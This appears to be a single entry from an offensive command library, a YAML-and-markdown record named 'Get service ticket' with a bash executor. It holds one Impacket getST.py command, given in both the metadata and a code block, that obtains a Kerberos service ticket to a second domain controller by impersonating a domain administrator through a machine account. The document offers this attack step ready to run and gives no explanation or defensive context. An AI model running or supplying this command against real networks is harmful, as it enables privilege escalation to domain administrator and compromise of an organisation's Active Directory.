---
id: 8705d2fb-8f36-4dd2-b0e5-d6086f1867cb
name: Get service ticket
type: command
executor: bash
data: getST.py -spn host/second-dc-server.local 'relaytest.local/MACHINE$:PASSWORD'
  -impersonate DOMAIN_ADMIN_USER_NAME
output: null
created_at: '2023-04-06T03:56:05.533144+00:00'
updated_at: '2023-04-10T20:26:36.992508+00:00'
---

# Get service ticket

```bash
getST.py -spn host/second-dc-server.local 'relaytest.local/MACHINE$:PASSWORD' -impersonate DOMAIN_ADMIN_USER_NAME
```
